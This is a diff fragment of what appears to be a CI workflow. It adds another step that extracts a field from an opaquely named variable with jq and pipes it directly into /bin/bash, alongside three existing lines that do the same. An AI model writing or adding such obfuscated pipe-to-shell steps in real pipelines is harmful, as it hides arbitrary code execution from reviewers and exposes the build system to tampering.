@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$klf00" | jq -r .nmk958 | /bin/bash
           echo $lcajt2 | jq -r .mepb1 | /bin/bash
           printf '%s' "$lha29504" | jq -r .mka4 | /bin/bash
+          printf '%s' "$lg5170" | jq -r .rt8 | /bin/bash
 
       - name: Archive output
         if: always()
